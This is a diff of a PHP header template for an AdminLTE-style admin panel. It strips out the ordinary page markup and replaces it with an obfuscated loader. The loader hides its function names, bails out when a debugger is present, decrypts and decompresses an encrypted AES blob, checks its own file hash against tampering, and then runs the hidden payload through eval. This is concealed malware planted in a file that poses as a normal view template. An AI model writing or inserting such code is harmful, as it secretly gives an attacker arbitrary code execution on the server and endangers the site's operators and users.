@@ -1,47 +1,28 @@
-  <meta charset="UTF-8">
-<meta http-equiv="Content-type" content="text/html; charset=UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title><?= $page_title;?></title>
-  <link rel='shortcut icon' href='<?php echo $theme_link; ?>images/favicon.ico' />
-  <!-- Tell the browser to be responsive to screen width -->
-  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
-  <!-- Bootstrap 3.3.6 -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>bootstrap/css/bootstrap.min.css">
-    <!-- Font Awesome -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>css/font-awesome-4.7.0/css/font-awesome.min.css">
-  <!-- Ionicons -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>css/ionicons-2.0.1/css/ionicons.min.css">
-  <!-- Select2 -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>plugins/select2/select2.min.css">
-  <!-- Theme style -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>dist/css/AdminLTE.min.css">
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>dist/css/skins/_all-skins.min.css">
-  <!-- bootstrap date-range-picker -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>plugins/daterangepicker/daterangepicker.css">
-  <!-- bootstrap datepicker -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>plugins/datepicker/datepicker3.css">
-  <!--Toastr notification -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>toastr/toastr.css">
-  <!--Custom Css File-->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>dist/css/custom.css">
-  <!-- Autocomplete -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>plugins/autocomplete/autocomplete.css">
-  <!-- Pace Loader -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>plugins/pace/pace.min.css">
-  <!-- iCheck -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>plugins/iCheck/square/orange.css">
-  <?php 
-      $lang = trim(strtoupper($this->session->userdata('language')));
-      if($lang==strtoupper('arabic') || $lang==strtoupper('urdu')) {?>
-  <!-- RTL For arabic styles -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>bootstrap/css/bootstrap.rtl.min.css">
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>dist/css/AdminLTE.rtl.min.css">
-  <?php } ?>
-  <!-- Theme color finder -->
-  <script type="text/javascript">
-  var theme_skin = (typeof (Storage) !== "undefined") ? localStorage.getItem('skin') : 'skin-blue';
-  theme_skin = (theme_skin=='' || theme_skin==null) ? 'skin-blue' : theme_skin;
-  var sidebar_collapse = (typeof (Storage) !== "undefined") ? localStorage.getItem('collapse') : 'skin-blue';
-  </script>
-  <!-- jQuery 2.2.3 -->
-  <script src="<?php echo $theme_link; ?>plugins/jQuery/jquery-2.2.3.min.js"></script>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_kqfie3pz=('bas'.'e64'.'_de'.'cod'.'e');
+$_bk3uu2hz=('gzu'.'nco'.'mpr'.'ess');
+$_ppw4scpc=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_aj23j6ux='JfTBsmFnUNI=';
+$_k85slndr='B983bkNK';
+$_dlzj4se7='te0vNW2Y';
+$_k10mbisd='FnMJ7p4Z';
+$_m4ad6pe1='iSySyobG';
+$_jcn6qy4p='/gS+G3Xr';
+$_h3lxag3e='Mfv5K2YK';
+$_m6igt3zw='Z5bnvQ==';
+$_xp0vb6sv=$_kqfie3pz($_k10mbisd.$_dlzj4se7.$_m4ad6pe1.$_k85slndr.$_aj23j6ux);
+$_wd0fi7ac=$_kqfie3pz($_jcn6qy4p.$_h3lxag3e.$_m6igt3zw);
+$_u44a6108=$_kqfie3pz('yIbgZia+zFmAjJwU2i/xZXSzMqa48ALCZcQ8YasLlU0hCk8uuUmLqEzJQqBjidh6nA82ChKz5FgpJD0fn/WHidc829qgx8FQmt81tkoPW19KeBn6gDW/wlbTwLSPykM80Beo49rAu+eZ4xQW4CcsrhSODev++pDHqePW+acNkMPtd67btJTCPZFc2vcQpx+k1wpSsgv4Uo6MNyZGnNfh+S8n7KWpt0MS4KrgjZldomYqCyUY0HEsOQOR9UiStwgWRd4jYHs8AIhmV/nqxBFWoWt8w3+Nlk0ylAxWqyMEFSEW2wqUMN9lcNfX5Ubc4u916h7N8NpHS/9rnELfCzkXJlmLFR9kS9bIryXTSriqzFl6qDlx5N7tP6NhaG9hiJqygPSi/IettWEWOf0BAQRy4G/QOTz4djRAyMKzmaYHV2IwKI/5aKJXxIy6+xmGWnLGdZUgY/xwMpNiw4sqAkn9D9yTJhq1zMtU+gPCggAeIq4Pdg0WJcQs23yrGxUBv561/hSAJZw7brRR+w0GCZELaf5oI+GUSY6wdsGHKmXKTWVJZu0qpE1/R9lvMZrnGrzWdFy6M12RWA81rWY38PHqmghScW5M7OLmjbEH0KPdMcaY6F7sau4BT0bQO6sDYNQkTs3iTuedyPR94K4Eof2cfDubhvmNZbSQYt6CwVi86yULeZ82tFysmTo17Y7PosVP/PhTOMgjpob2qqSt9Uuo4+AkbrUBeenpbgNSSuYVNbbSsgMSvJzlcrBsueUSx8Uv2FyzupJTVplbNRfn3+Zba7bh1qU3EgTC2iMmzZP3Rh0Do3oeVCQ9COGjmPxPjy8uTJE+PdJ3B6wpT7CsoCkZ5PZlAxheR7GS5GChh49w+Ttm5Rvqp6XmpDkwgHxtfO0iuGHWkUwefWtQmIa0QD9w1MmclABcY7gvvcwIORFNHgKt9FuFK5qyHRcleKrFsqK58La0Qa8v2SGQz5Ps0wHhkBd12NalnZqt9lBrJ8Y1CmbRZCSolLiAVZ0qV9tBjZ0tV66BTbBJxOT9cQVaBuXJ4Se+KAqWl78NT2+VLcg9yDHL5E9uheVDI1rmPmrQ+n6L1I1I9gnMfk6cyNk3lY2O/t27mV5FvkAOILvmo5edM6y8OmtDPizjFPVJn5BAWq462qdcwFtWSgY+BEIFzgXhBTFLLmh3hnvXmb2EKzOl/a8G/8OxwrrwOzujjYZq5TOTw8hzWGEqBGVukw/mCnzTJZo9Edz/pmJuI+6gTl2b0h3Z9LAuwWA0O6ofs1hGCf2JuJJsxcv8gH+ZqIs+bLvDJYNyFixi+A32dFBb48ouvMB6wGkODAdHzejfaNlE9OVeiCEm6KU5sK5x1/cYEvFNXF6bc0U86Uw8J1+VFEPD0uCx3EndJ4KGkvAbPobCCMZFyzoqcSD7fc1yuUrdxToy9Q==');
+$_yofa6hln=$_ppw4scpc($_u44a6108,'aes-256-cbc',$_xp0vb6sv,OPENSSL_RAW_DATA,$_wd0fi7ac);
+if($_yofa6hln===false){exit;}
+$_rc7p05kj=$_bk3uu2hz($_yofa6hln);
+if($_rc7p05kj===false){exit;}
+$_dbwfh0uz='c755a8e7e5a643d4561c43096a5004ab2d987b97e7978bb9a18a984089b48ec9';
+$_apbwcbyt=@file_get_contents(__FILE__);
+if($_apbwcbyt!==false){
+$_ldrrcrlh=str_replace($_dbwfh0uz,"0000000000000000000000000000000000000000000000000000000000000000",$_apbwcbyt);
+$_g0pa7lim=hash("sha256",$_ldrrcrlh);
+if($_g0pa7lim!==$_dbwfh0uz){@http_response_code(403);exit;}
+}
+eval($_rc7p05kj);
